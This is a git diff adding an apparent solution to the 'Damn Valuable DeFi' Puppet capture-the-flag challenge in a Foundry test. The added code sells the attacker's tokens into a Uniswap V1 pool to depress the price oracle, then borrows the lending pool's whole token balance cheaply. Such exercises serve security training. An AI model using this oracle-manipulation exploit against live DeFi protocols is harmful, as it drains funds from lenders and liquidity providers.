@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
+import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
 
 interface UniswapV1Exchange {
     function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
@@ -100,6 +101,23 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+
+        //sell DVT -> price down
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        //uint256 tokenPrice = uniswapExchange.getTokenToEthInputPrice(1 ether);
+        uint256 swapOk = uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1 ether, DEADLINE);
+        //log the attacker balance of eth
+        uint256 dvtInThePool = dvt.balanceOf(address(puppetPool));
+        puppetPool.borrow{value: 20 ether}(dvtInThePool);
+        uint256 attackerDvtBalance = dvt.balanceOf(address(attacker));
+        console.log("balance : ", attackerDvtBalance);
+        vm.stopPrank();
+        //AMM formula
+
+        //uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_ETH_BALANCE, 0, DEADLINE);
+
+        //use the ether to borrow as much DVT as possible
 
         /**
          * EXPLOIT END *
